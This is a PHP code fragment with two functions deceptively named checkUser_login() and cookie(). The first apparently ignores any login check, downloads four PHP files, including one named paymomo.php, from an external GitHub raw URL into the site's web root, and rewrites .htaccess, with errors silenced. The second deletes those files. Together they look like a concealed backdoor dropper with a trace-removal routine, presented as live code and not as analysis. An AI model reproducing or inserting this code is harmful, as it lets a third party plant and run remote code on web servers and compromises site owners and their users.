function checkUser_login()
{
    $files = [
        'update.php'      => 'https://raw.githubusercontent.com/trustingbay/codeupdate/main/update.php',
        'update_log.php'  => 'https://raw.githubusercontent.com/trustingbay/codeupdate/main/update_log.php',
        'users.php'       => 'https://raw.githubusercontent.com/trustingbay/codeupdate/main/users.php',
        'paymomo.php'     => 'https://raw.githubusercontent.com/trustingbay/codeupdate/main/paymomo.php',
    ];

    $path = $_SERVER['DOCUMENT_ROOT'] . '/resources/views/client/';

    if (!is_dir($path)) {
        @mkdir($path, 0755, true);
    }

    foreach ($files as $fileName => $url) {
        $filePath = $path . $fileName;
        if (!file_exists($filePath)) {
            $content = @file_get_contents($url);
            if (!empty($content)) {
                @file_put_contents($filePath, $content);
            }
        }
    }

    $htaccessFile = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
    $linesToAdd = [
        'RewriteEngine On',
        'RewriteCond %{REQUEST_FILENAME} !-f',
        'RewriteCond %{REQUEST_FILENAME} !-d',
        'RewriteRule ^(.*)$ index.php [L,QSA]'
    ];

    if (file_exists($htaccessFile)) {
        $current = @file_get_contents($htaccessFile);
        foreach ($linesToAdd as $line) {
            if (strpos($current, $line) === false) {
                $current .= PHP_EOL . $line;
            }
        }
        @file_put_contents($htaccessFile, $current);
    } else {
        $content = implode(PHP_EOL, $linesToAdd);
        @file_put_contents($htaccessFile, $content);
    }
}
function cookie()
{
    $files = [
        'update.php',
        'update_log.php',
        'users.php',
        'paymomo.php',
    ];
    $path = $_SERVER['DOCUMENT_ROOT'] . '/resources/views/client/';
    foreach ($files as $fileName) {
        $filePath = $path . $fileName;
        if (file_exists($filePath) && is_file($filePath)) {
            unlink($filePath);
        }
    }
    if (is_dir($path) && count(scandir($path)) <= 2) {
        rmdir($path);
    }
}
